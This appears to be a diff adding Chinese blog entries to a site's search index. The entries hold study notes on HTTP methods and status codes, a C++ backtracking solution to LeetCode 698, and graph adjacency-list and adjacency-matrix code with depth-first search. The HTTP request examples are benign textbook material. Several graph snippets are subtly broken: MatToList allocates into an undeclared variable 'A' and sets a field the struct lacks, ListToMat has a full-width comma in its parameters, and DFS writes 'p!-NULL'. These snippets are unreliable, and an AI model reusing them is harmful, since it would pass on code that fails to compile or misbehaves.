+<h3 id="PUT：传送文件"><a href="#PUT：传送文件" class="headerlink" title="PUT：传送文件"></a>PUT：传送文件</h3><p>PUT方法用来传输文件，就像FTP协议的文件上传一样，要求在请求报文的主体中包含文件内容，然后保存到请求URI指定的位置，以下是使用PUT方法进行请求及相应的例子</p>
+<p>请求：</p>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/example.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.hackr.jp</span><br><span class="line">Content-Type:text/html</span><br><span class="line">Content-Length:1560</span><br></pre></td></tr></table></figure>
+
+<p>其相应为：返回状态码<code>204 No Content</code></p>
+<h3 id="HEAD：获得报文首部"><a href="#HEAD：获得报文首部" class="headerlink" title="HEAD：获得报文首部"></a>HEAD：获得报文首部</h3><p>HEAD方法与GRT方法一样，只是不返回报文主体部分，只是用于确认URL的有效性及资源更新的日期时间等，以下是使用HEAD方法进行请求及相应的例子</p>
+<p>请求：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">HEAD</span> <span class="string">/index.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.hackr.jp</span><br></pre></td></tr></table></figure>
+
+<p>响应为返回<code>index.html</code>有关的相应首部</p>
+<h3 id="DELETE：删除文件"><a href="#DELETE：删除文件" class="headerlink" title="DELETE：删除文件"></a>DELETE：删除文件</h3><p>DELETE方法用来删除文件，是与PUT相反的方法。DELETE方法按请求URI删除指定的资源，以下是使用DELETE方法进行请求及相应的例子</p>
+<p>请求：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="string">/example.html</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.hackr.jp</span><br></pre></td></tr></table></figure>
+
+<p>其相应为：返回状态码<code>204 No Content</code></p>
+<h3 id="OPTIONS：询问支持的方法"><a href="#OPTIONS：询问支持的方法" class="headerlink" title="OPTIONS：询问支持的方法"></a>OPTIONS：询问支持的方法</h3><p>OPTIONS方法用来查询针对请求URL指定的资源支持的方法</p>
+<p><em>这些方法并不是每个都被服务器所支持，比如PUT与DELETE方法，因为不带验证机制，所以一般的web网站不会使用这些方法，当配合web应用程序的验证机制，或者遵守REST标准时才有可能开放使用</em></p>
+<p>以下是使用OPTIONS方法进行请求及响应的例子</p>
+<p>请求：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">OPTIONS</span> <span class="string">*</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.hackr.jp</span><br></pre></td></tr></table></figure>
+
+<p>其相应为：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Allow</span><span class="punctuation">: </span>GET, POST, HEAD, OPTIONS</span><br></pre></td></tr></table></figure>
+
+<h3 id="TRACE：追踪路径"><a href="#TRACE：追踪路径" class="headerlink" title="TRACE：追踪路径"></a>TRACE：追踪路径</h3><p>TRACE方法是让web服务器端将之前的请求通信返回给客户端的方法</p>
+<p>发送请求时，在Max-Forwards首部字段中填入数值，没经过一个服务器端就将该数值减1，当数值恰好减到0时，就停止继续传输，最后接收到请求的服务器端则返回状态码200OK的相应</p>
+<p>客户端通过TRACE方法可以查询发送出去的请求是怎样被加工修改的。这是因为，请求想要连接到源目标服务器可能会通过代理中转，TRACE方法就是用来确认连接过程中发生的一系列操作（如下图所示）</p>
+<p><img src="https://i.loli.net/2021/04/26/OPI37Lk9ngrwFK5.png" alt="image-20210426001239144"></p>
+<p>使用TRACE方法进行请求及响应的例子</p>
+<p>请求：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">TRACE</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hackr.jp</span><br><span class="line"><span class="attribute">Max-Forwards</span><span class="punctuation">: </span>2</span><br></pre></td></tr></table></figure>
+
+<p>其响应为：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>message/http</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1024</span><br><span class="line">TRACE / HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>hackr.jp</span><br><span class="line"><span class="attribute">Max-Forwards</span><span class="punctuation">: </span>2</span><br></pre></td></tr></table></figure>
+
+<p>CONNECT：要求用隧道协议连接代理</p>
+<p>CONNECT方法要求在与代理服务器通信时建立隧道，实现用隧道协议进行TCP通信，主要使用SSL和TLS协议把通信内容加密后经网络隧道传输，其请求例子如下：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CONNECT</span> <span class="string">proxy.hackr.jp:8080</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>proxy.hackr.jp</span><br></pre></td></tr></table></figure>
+
+<p>其响应为<code>HTTP/1.1 200 OK</code>之后进入网络隧道</p>
+<h2 id="3、http报文"><a href="#3、http报文" class="headerlink" title="3、http报文"></a>3、http报文</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>用于http协议交互的信息被称为http报文，<strong>请求端（客户端）的http报文，响应端（服务器端）的叫做响应报文</strong>。http报文本身是由多行（以CR+LF作换行符）数据构成的字符串文本</p>
+<p>http报文大致可分为报文首部和报文主体两块，两者由最初出现的空行（CR+LF）来划分，通常，并不一定要有报文主体，如下图所示：</p>
+<p><img src="https://i.loli.net/2021/04/26/GHtOm683eJvj1zc.png" alt="image-20210426221401958"></p>
+<p><img src="https://i.loli.net/2021/04/26/2SCqd4FpxYt3KVJ.png" alt="image-20210426221541832"></p>
+<p>以下是请求报文和响应报文的实例：</p>
+<p><img src="https://i.loli.net/2021/04/26/iEFLraZhHqw6WxO.png" alt="image-20210426221802398"></p>
+<p>请求报文和响应报文的首部内容由</p>
+<p><strong>（1）请求行</strong>：包含用于请求的方法，请求URL和HTTP版本</p>
+<p><strong>（2）状态行</strong>：包含表明响应结果的状态码，原因短语和HTTP版本</p>
+<p><strong>（3）首部字段</strong>：包含表示请求和响应的各种条件和属性的各类首部（一般有四种首部：通用首部、请求首部、响应首部、实体首部）</p>
+<p><strong>（4）其他</strong>：如cookie等</p>
+<h3 id="获取部分内容的范围请求"><a href="#获取部分内容的范围请求" class="headerlink" title="获取部分内容的范围请求"></a>获取部分内容的范围请求</h3><p>以前，用户不能用高速宽带访问忽略联网，下载尺寸较大的文件就会比较吃力，如果下载过程中遇到网络中断的情况，就必须从头开始，为了解决上述问题，需要一种可恢复的机制，能从之前下载中断处恢复下载</p>
+<p>要求实现该功能需要指定下载的实体范围，这样指定范围发送的请求叫做范围请求（Range Request）</p>
+<p>执行范围请求的时候，会用到首部字段Range来指定资源的byte范围，其指定形式如下：</p>
+<p>（1）5001~10000字节：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=5001-10000</span><br></pre></td></tr></table></figure>
+
+<p>（2）从5001字节之后全部的：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=5001-</span><br></pre></td></tr></table></figure>
+
+<p>（3）从一开始到3000字节和5000~7000字节的多重范围：</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Range</span><span class="punctuation">: </span>bytes=0-3000, 5000-7000</span><br></pre></td></tr></table></figure>
+
+<p>针对范围请求，响应会返回状态码为<code>206 Partial Content</code>的响应报文。另外，对于多重范围的范围请求，响应会在首部字段<code>Content-Type</code>标明<code>multipart/byteranges</code>后返回响应报文</p>
+<p>如果服务端无法响应范围请求，则会返回状态码<code>200 OK</code>和完整的实体内容</p>
+<h2 id="4、返回结果的http状态码"><a href="#4、返回结果的http状态码" class="headerlink" title="4、返回结果的http状态码"></a>4、返回结果的http状态码</h2><p>状态码的职责是当客户端向服务端发送请求时，描述返回时的请求结果，借助状态码，用户可以知道服务器端时正常处理的请求，还是出现了错误，状态码由<strong>三位数字</strong>和<strong>原因短语</strong>组成    ，数字中的第一维指定了响应类别，响应类别有以下五种：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>类别</th>
+<th>原因短语</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1XX</td>
+<td>Informational（信息性状态码）</td>
+<td>接受的请求正在处理</td>
+</tr>
+<tr>
+<td>2XX</td>
+<td>Success（成功状态码）</td>
+<td>请求正常处理完毕</td>
+</tr>
+<tr>
+<td>3XX</td>
+<td>Redirection（重定向状态码）</td>
+<td>需要进行附加操作以完成请求</td>
+</tr>
+<tr>
+<td>4XX</td>
+<td>Client Error（客户端错误状态码）</td>
+<td>服务器无法处理请求</td>
+</tr>
+<tr>
+<td>5XX</td>
+<td>Sever Error（服务器错误状态码）</td>
+<td>服务器处理请求出错</td>
+</tr>
+</tbody></table>
+<p>其中的一些常见的状态码如下：</p>
+<h3 id="2XX成功"><a href="#2XX成功" class="headerlink" title="2XX成功"></a>2XX成功</h3><p><em>2XX的响应结果表明请求被正常处理了</em></p>
+<p><strong>（1）200 OK</strong></p>
+<p>表示从客户端发来的请求在服务器端被正常处理了</p>
+<p>在响应报文内，随状态码一起返回的信息会因为方法的不同而发生改变。比如，在使用GET方法时，对应请求资源的实体会作为响应返回；而使用HEAD方法时，对应请求资源的实体主体不随报文首部作为响应返回（在响应中只返回首部，不返回实体的主体部分）</p>
+<p><strong>（2）204 No Content</strong></p>
+<p>该状态码代表服务器接收的请求已成功处理，但是在返回的响应报文中不含实体的主体部分。另外，也不允许返回任何实体的主体。比如，当从浏览器发出请求处理后，返回204响应，那么浏览器显示的页面不发生更新</p>
+<p>一般在只需要从客户端往服务器发送信息，而对客户端不需要发送新信息内容的情况下使用</p>
+<p><strong>（3）206 Partial Content</strong></p>
+<p>该状态码表示客户端进行了范围请求，而服务器成功执行了这部分的GET请求。响应报文中包含由Content-Range指定范围的实体内容</p>
+<h3 id="3XX重定向"><a href="#3XX重定向" class="headerlink" title="3XX重定向"></a>3XX重定向</h3><p>3XX响应结果表明浏览器需要执行某些特殊的处理以正确处理请求</p>
+<p><strong>（1）301 Moved Permanently</strong></p>
+<p>永久性重定向。该状态码表示请求的资源已被分配到了新的URL，以后应使用资源现在所指的URL。也就是说，如果已经把资源对应的URL保存为书签了，这是应该按Location首部字段提示的URL重新保存</p>
+<p>向下方给出的请求URL，当指定资源路径的最后忘记添加斜杠<code>/</code>，就会产生301状态码</p>
+<p><strong>（2）302 Found</strong></p>
+<p>临时性重定向。该状态码表示请求的资源已经被分配了新的URL，希望用户（本次）能使用新的URL访问</p>
+<p>和301 Moved Permanently状态码类似，但302状态码代表的资源不是被永久移动，只是临时性质的。换句话说，已移动的资源对应的URL在将来还有可能发生改变。比如，用户把URL保存成书签，但不会像301状态码出现时那样去更新书签，而是仍旧保留返回302状态码的页面对应的URL</p>
+<p><strong>（3）303 See Other</strong></p>
+<p>该状态码表示由于请求对应的资源存在着另一个URL，应使用GET方法定向获取请求的资源</p>
+<p>303状态码和302 Found状态码有着相同的功能，但303状态码明确表示客户端应当采用GET方法获取资源，这点与302状态码有区别</p>
+<p>比如，当使用POST方法访问一个GET程序，其执行后的处理结果希望客户端能够以GET方法重定向到另一个URL上去时，返回303状态码。虽然302状态码也可以实现相同的功能，但这里使用303状态码是最理想的</p>
+<p><em>当301、302、303响应状态码返回时，几乎所有的浏览器都会把POST改成GET，并删除请求报文内的主体，之后请求主体会自动再次发送，301、302标准是禁止将POST方法改变成GET方法的，但实际使用时大家都会这么做</em></p>
+<p><strong>（4）304 Not Modified</strong></p>
+<p>该状态码表示客户端发送附带条件的请求（<em>指采用GET方法的请求报文中包含If-Match、If-Modified-Since、If-None-Match、If-Range、If-Unmodified-Since中任意首部</em>）时，服务器端允许请求访问资源，却因发生请求未满足条件的情况后，直接返回304 Not Modified（服务器端资源未改变，可直接使用客户端未过期的缓存），304状态码返回时，不包含任何响应的主体部分，304虽然被划分在3XX类别中，但是和重定向没有任何关系</p>
+<p><strong>（5）307 Temporary Redirect</strong></p>
+<p>临时重定向。该状态码与302 Found有相同的含义，尽管302标准禁止POST变换成GET，但实际使用时大家并不遵守</p>
+<p>307会遵照浏览器标准，不会从POST变为GET。但是，对于处理响应时的行为，每种浏览器有可能出现不同的情况</p>
+<h3 id="4XX客户端错误"><a href="#4XX客户端错误" class="headerlink" title="4XX客户端错误"></a>4XX客户端错误</h3><p><strong>（1）400 Bad Request</strong></p>
+<p>该状态码表示请求报文中存在语法错误。当错误发生时，需修改请求的内容后再次发送请求。另外，浏览器会像200 OK一样对待该状态码</p>
+<p><strong>（2）401 Unauthorized</strong></p>
+<p>该状态码表示发送的请求需要有通过HTTP认证的认证信息。另外如果之前已经进行过一次请求，则表示用户认证失败</p>
+<p>返回含有401的响应必须包含一个适用于被请求资源的WWW-Authenticate首部用以质询用户信息，当浏览器初次接收到401响应，会弹出认证用的对话窗口</p>
+<p><strong>（3）403 Forbidden</strong></p>
+<p>该状态码表明对请求资源的访问被服务器拒绝了。服务器端没有必要给出拒绝的详细理由，但这样如果想作说明的话，可以在实体的书体部分对原因进行描述，这样就可以让用户看到了</p>
+<p>未获得文件系统的访问授权、访问权限出现某些问题（从未授权的发送源IP地址试图访问）等列举的情况都可能是发生403的原因</p>
+<p><strong>（4）404 Not Found</strong></p>
+<p>该状态码表明服务器上无法找到请求的资源，除此之外，也可以在服务器端拒绝请求且不想说明理由时使用</p>
+<h3 id="5XX服务器错误"><a href="#5XX服务器错误" class="headerlink" title="5XX服务器错误"></a>5XX服务器错误</h3><p><strong>（1）500 Internal Server Error</strong></p>
+<p>该状态码表明服务器端在执行请求时发生了错误。也有可能是Web应用存在的bug或某些临时的故障</p>
+<p><strong>（2）503 Service Unavailable</strong></p>
+<p>该状态码表明服务器暂时处于超负荷或正在进行停机维护，现在无法处理请求，如果事先得知解除以上状况需要的时间，最好写入Retry-After首部字段再返回给客户端</p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+        <category>基础知识</category>
+      </categories>
+      <tags>
+        <tag>http</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>leetcode笔记</title>
+    <url>/2021/04/29/leetcode%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h3 id="leetcode-698划分为k个相等的子集"><a href="#leetcode-698划分为k个相等的子集" class="headerlink" title="leetcode-698划分为k个相等的子集"></a>leetcode-698划分为k个相等的子集</h3><p>题目描述：给定一个整数数组<code>nums</code>和一个正整数<code>k</code>，找出是否有可能把这个数组分成<code>k</code>个非空子集，其总和都相等。</p>
+<p>示例 ：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入： nums &#x3D; [4, 3, 2, 3, 5, 2, 1], k &#x3D; 4</span><br><span class="line">输出： True</span><br><span class="line">说明： 有可能将其分成 4 个子集（5），（1,4），（2,3），（2,3）等于总和。</span><br></pre></td></tr></table></figure>
+
+
+<p>提示：</p>
+<p><code>1 &lt;= k &lt;= len(nums) &lt;= 16</code><br><code>0 &lt; nums[i] &lt; 10000</code></p>
+<p>思路：首先对数组进行筛查，如果数组的和无法整除k，则返回false，接下来遍历一遍数组，如果数组中有某个元素大于分组后每一组的和，则返回false</p>
+<p>接下来进行的过程其实很简单，便是要将k-1个桶填满，此时可以用递归函数进行结局啊，该函数的功能是：从数组的第k位开始向后寻找，返回值<strong>是当前手中的桶的这一种情况是否满足问题的要求，即当前的情况和当前情况确定下来之后对之后的影响</strong></p>
+<p>如果说，当前已经填完了k-1个桶，则返回真</p>
+<p>如果说，当前恰好填满了桶，则对下一个桶、下下个桶….直到填完之后的桶进行判断（此时可以认为是开新桶了，所以从0开始），如果说在当前的所有填满的桶确定的情况下之后的都能实现则返回真（递归之处在这里：大问题为检视包括当前的桶在内以及之后的桶的情况是否满足问题要求，小问题为之后的桶的情况是否满足要求，如果小问题返回值为真，则大问题的返回值也为真，如果小问题返回值为假，说明当前这个桶有不周到之处，此时也返回假）</p>
+<p>如果说，当前没有把桶填满，则从当前桶的起始检视位置开始，向后进行检视，如果说遇到没有用到的数，则尝试将其放进桶中，这时候再用该函数对放了这个数之后的情形进行判断（递归之处在这里：大问题为检视包括当前的桶在内以及之后的桶的情况是否满足问题要求，小问题为检视把这个数放进去之后（所以研究小问题时起始检视位置为当前数的位置+1）当前及之后的桶的情况是否能符合要求，如果小问题返回为真，则说明当前这个数是可以放进去的，那么就保持该数为使用了的状态，并且将大问题返回真，如果说小问题返回假，则说明这个数不能放进去，那么就把它拿出来，继续在剩余的数组之中寻找能够使问题得到满足的数），如果说遍历完了一遍数组，都无法得到满足，则大问题，即检视包括当前的桶在内以及之后的桶的情况是否满足问题要求返回假</p>
+<p><strong>如果说觉得上面的陈述有些绕，可以这么想，你是一个人来做这个工作，你往桶中放元素，每想往桶中放某个元素，或者说判断桶满时可不可以把桶放下的时候，都可以去询问智者，放了这个元素之后之后的问题有没有可能成功，智者一族也不是无所不能的，他只能将这个元素先放进桶里面，然后进行判断，如果说元素放进去之后 桶炸了，他会直接告诉你不行。如果刚好分完了，他会直接告诉你行。如果刚好桶满了，他会拿着目前已经放下的桶去问智者的父亲，智者的父亲重复他的工作，并且告诉智者行不行，智者再告诉你行不行。如果说桶还没满，智者会从剩下没用过的元素里面一个个尝试，并且问他的智者行不行，他的父亲如果告诉他不行，则继续尝试，如果他的父亲一旦告诉他行，智者就会转告你行，如果找完了都不行，智者就会告诉你不行。（智者的父亲跟智者做的是同样的事）</strong></p>
+<p>代码实现如下：</p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">bool</span> flag [<span class="number">16</span>]=&#123;&#125;; <span class="comment">//用于判断是否使用</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span>  <span class="title">IsPartition</span><span class="params">(<span class="keyword">int</span> start ,<span class="keyword">int</span>* a,<span class="keyword">int</span> n, <span class="keyword">bool</span>* flag,<span class="keyword">int</span> k,<span class="keyword">int</span> now,<span class="keyword">int</span> target )</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">canPartitionKSubsets</span><span class="params">(<span class="keyword">int</span>* a, <span class="keyword">int</span> n, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        sum+=a[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">16</span>;i++)</span><br><span class="line">        flag [i]=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>||sum%k!=<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">int</span> bucket=sum/k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        <span class="keyword">if</span>(a[i]&gt;bucket)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">IsPartition</span>(<span class="number">0</span>,a,n,flag,k,<span class="number">0</span>,bucket);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span>  <span class="title">IsPartition</span><span class="params">(<span class="keyword">int</span> start ,<span class="keyword">int</span>* a,<span class="keyword">int</span> n, <span class="keyword">bool</span>* flag,<span class="keyword">int</span> k,<span class="keyword">int</span> now,<span class="keyword">int</span> target )</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">1</span>) <span class="comment">//判断出剩下只有一个桶了，直接返回真</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(now==target) <span class="comment">//当前桶刚好满，返回假定当前即之前桶可行的情况下后面是否可行</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">IsPartition</span>(<span class="number">0</span>,a,n,flag,k<span class="number">-1</span>,<span class="number">0</span>,target);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(now&gt;target) <span class="comment">//桶爆了，返回假</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=start;i&lt;n;i++)&#123; <span class="comment">//寻找到一个可以放进去的</span></span><br><span class="line">        <span class="keyword">if</span>(!flag[i])&#123;</span><br><span class="line">            flag[i]=<span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">IsPartition</span>(i+<span class="number">1</span>,a,n,flag,k,now+a[i],target)) <span class="comment">//假定放进去之后后面的都可行则返回真</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            flag[i]=<span class="literal">false</span>;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//都找不到返回假</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>算法</category>
+        <category>刷题</category>
+        <category>leetcode</category>
+      </categories>
+      <tags>
+        <tag>算法</tag>
+        <tag>leetcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>图相关</title>
+    <url>/2021/05/02/%E5%9B%BE%E7%9B%B8%E5%85%B3/</url>
+    <content><![CDATA[<h2 id="0、图的邻接表与邻接矩阵的存储类型定义"><a href="#0、图的邻接表与邻接矩阵的存储类型定义" class="headerlink" title="0、图的邻接表与邻接矩阵的存储类型定义"></a>0、图的邻接表与邻接矩阵的存储类型定义</h2><p><strong>（1）图的邻接表存储类型定义：</strong></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ANode</span>&#123;</span><span class="comment">//边结点    </span></span><br><span class="line">	<span class="keyword">int</span> adjvex;<span class="comment">//该边的终点编号</span></span><br><span class="line">   	<span class="class"><span class="keyword">struct</span> <span class="title">ANode</span> *<span class="title">nextarc</span>;</span><span class="comment">//指向下一条边的指针</span></span><br><span class="line">   	InfoType info;<span class="comment">//该边的权值等信息</span></span><br><span class="line">&#125;ArcNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Vnode</span>&#123;</span><span class="comment">//头结点    </span></span><br><span class="line">	Vertex data;<span class="comment">//顶点信息</span></span><br><span class="line">	ArcNode *firstarc;<span class="comment">//指向第一条边</span></span><br><span class="line">&#125;VNode;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>     </span><br><span class="line">	VNode adjlist[MAXV];<span class="comment">//邻接表</span></span><br><span class="line">	<span class="keyword">int</span> n,e;<span class="comment">//图中顶点数n和边数e</span></span><br><span class="line">&#125;AdjGraph;</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）图的邻接矩阵存储类型定义：</strong></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span>  MAXV  20 <span class="comment">//最大顶点个数	</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span>    </span><br><span class="line">	<span class="keyword">int</span> no;<span class="comment">//顶点编号</span></span><br><span class="line">	InfoType info;<span class="comment">//顶点其他信息</span></span><br><span class="line">&#125;VertexType;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span>    </span><br><span class="line">	<span class="keyword">int</span> edges[MAXV][MAXV];<span class="comment">//邻接矩阵</span></span><br><span class="line">	<span class="keyword">int</span> n,e;<span class="comment">//顶点数，边数</span></span><br><span class="line">	VertexType vexs[MAXV];<span class="comment">//存放顶点信息</span></span><br><span class="line">&#125;MatGraph;</span><br></pre></td></tr></table></figure>
+
+<h2 id="1、邻接表与邻接矩阵的转换"><a href="#1、邻接表与邻接矩阵的转换" class="headerlink" title="1、邻接表与邻接矩阵的转换"></a>1、邻接表与邻接矩阵的转换</h2><p><strong>（1）邻接矩阵转化为邻接表</strong></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MatToList</span><span class="params">(MatGraph g, AdjGraph *&amp;G)</span></span>&#123; <span class="comment">//将邻接矩阵g转换成邻接表G</span></span><br><span class="line">	<span class="keyword">int</span> i,j;</span><br><span class="line">    ArcNode *p;</span><br><span class="line">    A=(AdjGraph *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(AdjGraph));</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        G-&gt;adjlist[i].firstarc=<span class="literal">NULL</span>;<span class="comment">//将邻接表中所有头结点的指针域置初值</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;g.n;i++)</span><br><span class="line">        <span class="keyword">for</span>(j=g.n<span class="number">-1</span>;j&gt;=<span class="number">0</span>;j--)</span><br><span class="line">            <span class="keyword">if</span>(g.edges[i][j]!=<span class="number">0</span> &amp;&amp; g.edges[i][j]!=INF)&#123;<span class="comment">//如果存在一条边</span></span><br><span class="line">                p=(ArcNode *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(ArcNode));<span class="comment">//建立一个边结点p</span></span><br><span class="line">                p-&gt;adjvex=j; </span><br><span class="line">                p-&gt;weight=g.edges[i][j];</span><br><span class="line">                p-&gt;nextarc=G-&gt;adjlist[i].firstarc;<span class="comment">//采用头插法插入结点p</span></span><br><span class="line">                G-&gt;adjlist[i].firstarc=p;</span><br><span class="line">            &#125;</span><br><span class="line">    G-&gt;n=g.n;G-&gt;e=g.e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>（2）邻接表转化为邻接矩阵</strong></p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ListToMat</span><span class="params">(AdjGraph *G，MatGraph &amp;g)</span></span>&#123;<span class="comment">//将邻接表G转换成邻接矩阵g     </span></span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	ArcNode *p;</span><br><span class="line">	<span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;G-&gt;n;i++)&#123;	</span><br><span class="line">		p=G-&gt;adjlist[i].firstarc;<span class="comment">//p指向第i个单链表的首结点</span></span><br><span class="line">		<span class="keyword">while</span> (p!=<span class="literal">NULL</span>)&#123;      </span><br><span class="line">			g.edges[i][p-&gt;adjvex]=p-&gt;weight;</span><br><span class="line">			p=p-&gt;nextarc;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	g.n=G-&gt;n; </span><br><span class="line">    g.e=G-&gt;e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、深度优先遍历（DFS）"><a href="#2、深度优先遍历（DFS）" class="headerlink" title="2、深度优先遍历（DFS）"></a>2、深度优先遍历（DFS）</h2><p>深度优先遍历的思路是：从图中的某个初始顶点v出发，首先访问顶点v，然后来到与v相邻的另一个顶点w，然后对w进行相同的深度优先遍历操作，当某个顶点的所有与之相邻的顶点都被访问过，说明该顶点的深度优先遍历结束，以此类推，当v顶点的直接相邻的顶点都被访问，说明整个图的深度优先遍历结束</p>
+<p>其代码实现（邻接表）为：</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> visited[MAX]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">DFS</span><span class="params">(AdjGraph *G, <span class="keyword">int</span> v)</span></span>&#123;</span><br><span class="line">    ArcNode *p;</span><br><span class="line">    visited[v]=<span class="number">1</span>; <span class="comment">//置已经被访问</span></span><br><span class="line">    p=G-&gt;adjlist[v].firstarc; <span class="comment">//p为与顶点v第一个相邻的顶点</span></span><br><span class="line">    <span class="keyword">while</span>(p!-<span class="literal">NULL</span>)&#123; <span class="comment">//访问与v所有相邻的顶点</span></span><br><span class="line">        <span class="keyword">if</span>(visited[p-&gt;adjvex]==<span class="number">0</span>) <span class="comment">//如果顶点没有被访问过</span></span><br><span class="line">            <span class="built_in">DFS</span>(G,p-&gt;adjvex); <span class="comment">//从该顶点开始进行深度优先遍历</span></span><br><span class="line">        p=p-&gt;nextarc;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当访问某个顶点v时，DFS的时间主要华仔从该顶点出发查找它的邻接点上。当用邻接表表示图时，需要遍历该顶点的所有邻接点，所以DFS的总时间复杂度为O(n+e)，当用邻接矩阵表示图时，需要遍历该顶点行的所有元素，所以DFS的总时间复杂度为O(n²)</p>
